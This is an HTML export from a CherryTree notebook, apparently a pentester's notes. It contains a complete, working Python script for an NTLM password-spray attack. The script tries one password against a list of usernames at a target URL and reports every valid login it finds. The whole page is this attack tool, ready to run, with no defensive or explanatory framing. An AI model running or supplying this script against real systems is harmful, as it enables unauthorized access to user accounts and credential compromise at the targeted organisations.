<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>password_sprayer.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>password_sprayer.py</h1><br/><p>##########################################</p><p></p><p>#!/usr/bin/python3</p><p></p><p>import requests</p><p>from requests_ntlm import HttpNtlmAuth</p><p>import sys, getopt</p><p></p><p>class NTLMSprayer:</p><p>    def __init__(self, fqdn):</p><p>        self.HTTP_AUTH_FAILED_CODE = 401</p><p>        self.HTTP_AUTH_SUCCEED_CODE = 200</p><p>        self.verbose = True</p><p>        self.fqdn = fqdn</p><p></p><p>    def load_users(self, userfile):</p><p>        self.users = []</p><p>        lines = open(userfile, &#39;r&#39;).readlines()</p><p>        for line in lines:</p><p>            self.users.append(line.replace(&quot;\r&quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;))</p><p></p><p>    def password_spray(self, password, url):</p><p>        print (&quot;[*] Starting passwords spray attack using the following password: &quot; + password)</p><p>        count = 0</p><p>        for user in self.users:</p><p>            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + &quot;\\&quot; + user, password))</p><p>            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):</p><p>                print (&quot;[+] Valid credential pair found! Username: &quot; + user + &quot; Password: &quot; + password)</p><p>                count += 1</p><p>                continue</p><p>            if (self.verbose):</p><p>                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):</p><p>                    print (&quot;[-] Failed login with Username: &quot; + user)</p><p>        print (&quot;[*] Password spray attack completed, &quot; + str(count) + &quot; valid credential pairs found&quot;)</p><p></p><p>def main(argv):</p><p>    userfile = &#39;&#39;</p><p>    fqdn = &#39;&#39;</p><p>    password = &#39;&#39;</p><p>    attackurl = &#39;&#39;</p><p></p><p>    try:</p><p>        opts, args = getopt.getopt(argv, &quot;hu:f:p:a:&quot;, [&quot;userfile=&quot;, &quot;fqdn=&quot;, &quot;password=&quot;, &quot;attackurl=&quot;])</p><p>    except getopt.GetoptError:</p><p>        print (&quot;ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;&quot;)</p><p>        sys.exit(2)</p><p></p><p>    for opt, arg in opts:</p><p>        if opt == &#39;-h&#39;:</p><p>            print (&quot;ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;&quot;)</p><p>            sys.exit()</p><p>        elif opt in (&quot;-u&quot;, &quot;--userfile&quot;):</p><p>            userfile = str(arg)</p><p>        elif opt in (&quot;-f&quot;, &quot;--fqdn&quot;):</p><p>            fqdn = str(arg)</p><p>        elif opt in (&quot;-p&quot;, &quot;--password&quot;):</p><p>            password = str(arg)</p><p>        elif opt in (&quot;-a&quot;, &quot;--attackurl&quot;):</p><p>            attackurl = str(arg)</p><p></p><p>    if (len(userfile) &gt; 0 and len(fqdn) &gt; 0 and len(password) &gt; 0 and len(attackurl) &gt; 0):</p><p>        #Start attack</p><p>        sprayer = NTLMSprayer(fqdn)</p><p>        sprayer.load_users(userfile)</p><p>        sprayer.password_spray(password, attackurl)</p><p>        sys.exit()</p><p>    else:</p><p>        print (&quot;ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;&quot;)</p><p>        sys.exit(2)</p><p></p><p></p><p></p><p>if __name__ == &quot;__main__&quot;:</p><p>    main(sys.argv[1:])</p><p>    </p><p>##########################################</p><p></p><p></p></div>
</body>
</html>
